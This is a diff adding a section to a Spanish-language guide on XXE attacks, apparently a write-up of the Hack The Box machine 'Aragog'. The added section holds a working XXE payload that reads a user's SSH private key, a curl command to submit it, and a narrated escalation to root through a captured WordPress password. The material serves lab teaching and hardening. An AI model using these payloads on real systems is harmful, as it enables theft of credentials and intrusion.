@@ -67,6 +67,23 @@ En pipelines de datos, el fichero clave suele ser el del broker o el del propio 
 - **Out-of-band con `expect://`** (PHP con la extensión): ejecución directa.
 - **DoS**: cuidado con las *billion laughs*; en un lab se entiende, en producción no se hace.
 
+## Caso real: Aragog
+
+`hosts.php` acepta un XML para añadir un host y devuelve el resultado. El campo de nombre resuelve entidades externas, así que se puede leer la clave privada de `florian` y usarla por SSH:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE hosts [<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa">]>
+<hosts><host><ip>10.10.14.6</ip><name>&xxe;</name></host></hosts>
+```
+
+```bash
+curl -s -X POST http://aragog.htb/hosts.php \
+  -H 'Content-Type: application/xml' --data-binary @hosts.xml
+```
+
+La clave aparece en la respuesta. Con ella se entra como `florian`; `pspy` muestra que `wp-login.php` está modificado y escribe las credenciales que se introducen en un fichero. Esa captura permite reutilizar la contraseña de WordPress para `root`. La lección es doble: el XXE no solo lee ficheros, también alimenta la siguiente credencial de la cadena.
+
 ## Blindaje
 
 ```python
